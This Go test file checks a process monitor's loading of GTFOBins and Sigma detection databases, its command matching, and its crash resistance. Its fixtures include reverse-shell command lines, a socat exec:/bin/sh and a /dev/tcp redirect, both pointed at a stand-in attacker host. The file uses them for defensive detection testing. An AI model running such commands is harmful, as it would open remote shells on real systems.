package monitor

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// These tests exercise the detection-DB load paths (GTFOBins + Sigma) and their
// usage (matching), for both the "DB present" and "DB absent" cases — the path
// that crashed in issue #505 and that CI integration tests do not cover (CI has
// no clone). They are hermetic: no Incus, no network.

// --- GTFOBins -------------------------------------------------------------

// Representative GTFOBins entries, including the exact token that triggered #505
// (socat "tcp-connect:attacker.com:12345") and a distinctive-keyword entry used
// to assert matching works end to end.
var gtfobinsFixtures = map[string]string{
	"socat": `functions:
  reverse-shell:
  - code: |-
      socat tcp-connect:attacker.com:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane
`,
	"frobnicator": `functions:
  reverse-shell:
  - code: |-
      frobnicator --frobsocket attacker.com 4444
`,
	// Edge shapes that stress the placeholder stripper.
	"edgey": `functions:
  reverse-shell:
  - code: |-
      edgey /dev/tcp/attacker.com/12345 /path/to/x 0<&196
`,
}

func writeGTFObinsClone(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	binDir := filepath.Join(dir, "_gtfobins")
	if err := os.MkdirAll(binDir, 0o755); err != nil {
		t.Fatal(err)
	}
	for name, body := range gtfobinsFixtures {
		if err := os.WriteFile(filepath.Join(binDir, name), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

// DB present: loading parses every entry without panic, derives keywords, and the
// derived pattern actually matches a process command (the execution/usage path).
func TestExecPatterns_DBPresent_LoadParseMatch(t *testing.T) {
	pats := loadExecPatterns(writeGTFObinsClone(t)) // must not panic (#505)
	if len(pats) == 0 {
		t.Fatal("expected exec patterns from a populated GTFOBins clone")
	}

	// The frobnicator entry's only distinctive keyword is "--frobsocket"
	// (placeholders + numeric port are stripped). A matching command must hit it.
	if name := matchSuspiciousExec("frobnicator --frobsocket 1.2.3.4 4444", pats); name == "" {
		t.Error("DB-derived frobnicator pattern did not match a matching command")
	}
	// A benign command must not match.
	if name := matchSuspiciousExec("ls -la /tmp", pats); name != "" {
		t.Errorf("benign command unexpectedly matched %q", name)
	}
}

// DB absent: loader falls back to the compiled-in defaults (non-empty) and does
// not panic, so detection still works without a clone.
func TestExecPatterns_DBAbsent_FallsBackToDefaults(t *testing.T) {
	withDefaults := loadExecPatterns(filepath.Join(t.TempDir(), "nonexistent"))
	if len(withDefaults) == 0 {
		t.Fatal("expected compiled-in default exec patterns when no clone is present")
	}
	// An empty (existing) clone dir is also fine.
	empty := t.TempDir()
	_ = os.MkdirAll(filepath.Join(empty, "_gtfobins"), 0o755)
	if got := loadExecPatterns(empty); len(got) == 0 {
		t.Fatal("expected default patterns for an empty clone dir")
	}
}

// --- Sigma ----------------------------------------------------------------

// A loadable linux/process_creation rule (level high) with a distinctive
// CommandLine token, plus shapes that exercise the condition/selection parsers.
const sigmaCanaryRule = `title: Coi Test Canary
id: 00000000-0000-0000-0000-000000000001
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        CommandLine|contains: 'coi-sigma-canary-zzz'
    condition: selection
level: high
`

const sigmaAndNotRule = `title: Coi Test And-Not
id: 00000000-0000-0000-0000-000000000002
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        CommandLine|contains: 'needle-aaa'
    filter:
        CommandLine|contains: 'allowed-bbb'
    condition: selection and not filter
level: critical
`

func writeSigmaClone(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	rulesDir := filepath.Join(dir, "rules", "linux", "process_creation")
	if err := os.MkdirAll(rulesDir, 0o755); err != nil {
		t.Fatal(err)
	}
	for name, body := range map[string]string{
		"canary.yml": sigmaCanaryRule,
		"andnot.yml": sigmaAndNotRule,
	} {
		if err := os.WriteFile(filepath.Join(rulesDir, name), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

// DB present: rules load without panic and the compiled rule matches a process.
func TestSigmaPatterns_DBPresent_LoadParseMatch(t *testing.T) {
	pats := loadSigmaPatterns(writeSigmaClone(t)) // must not panic
	if len(pats) == 0 {
		t.Fatal("expected sigma patterns from a populated clone")
	}

	matchedCanary := false
	for _, p := range pats {
		if matchSigmaPattern("/usr/bin/x", "evil coi-sigma-canary-zzz now", "/usr/bin/bash", "bash", p) {
			matchedCanary = true
		}
	}
	if !matchedCanary {
		t.Error("sigma canary rule did not match a matching command line")
	}

	// "selection and not filter": matches needle alone, excluded when filter present.
	var andNot *sigmaPattern
	for i := range pats {
		if strings.Contains(pats[i].Title, "And-Not") {
			andNot = &pats[i]
		}
	}
	if andNot == nil {
		t.Fatal("expected the and-not rule to load")
	}
	if !matchSigmaPattern("/x", "run needle-aaa", "/bin/bash", "bash", *andNot) {
		t.Error("and-not rule should match needle without the filter token")
	}
	if matchSigmaPattern("/x", "run needle-aaa allowed-bbb", "/bin/bash", "bash", *andNot) {
		t.Error("and-not rule should be excluded when the filter token is present")
	}
}

// DB absent: no rules, no panic (Sigma is purely additive).
func TestSigmaPatterns_DBAbsent_NoneNoPanic(t *testing.T) {
	if got := loadSigmaPatterns(filepath.Join(t.TempDir(), "nonexistent")); len(got) != 0 {
		t.Errorf("expected no sigma patterns without a clone, got %d", len(got))
	}
}

// --- #505-class guard: parser must never panic on hostile token input -------

func TestGTFObinsStripPlaceholders_NeverPanics(t *testing.T) {
	hostile := []string{
		"tcp-connect:attacker.com:12345", // the exact #505 trigger
		"", "attacker", "attacker.com", "/path/to", ":::attacker.com:::",
		"İİİattacker", "ẞ/path/to/attacker.com", "🔥/path/to/🔥",
		"a:attacker.com:attacker:/path/to:b",
		strings.Repeat("/attacker.com", 2000),
		strings.Repeat("İ", 50) + "attacker",
	}
	for _, tok := range hostile {
		func() {
			defer func() {
				if r := recover(); r != nil {
					t.Errorf("gtfobinsStripPlaceholders(%q) panicked: %v", tok, r)
				}
			}()
			_ = gtfobinsStripPlaceholders(tok)
		}()
	}
}
